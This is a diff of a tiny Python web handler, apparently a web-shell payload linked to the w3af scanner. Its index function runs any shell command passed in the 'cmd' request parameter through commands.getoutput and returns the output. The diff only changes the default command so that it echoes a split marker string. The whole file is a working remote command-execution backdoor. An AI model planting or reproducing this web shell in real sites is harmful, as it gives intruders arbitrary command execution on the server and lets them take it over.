@@ -1,4 +1,4 @@
 import commands
 
-def index(req, cmd='echo ""' ):                               
-  return commands.getoutput( cmd )
+def index(req, cmd='echo "w3' + 'af"' ):
+    return commands.getoutput( cmd )
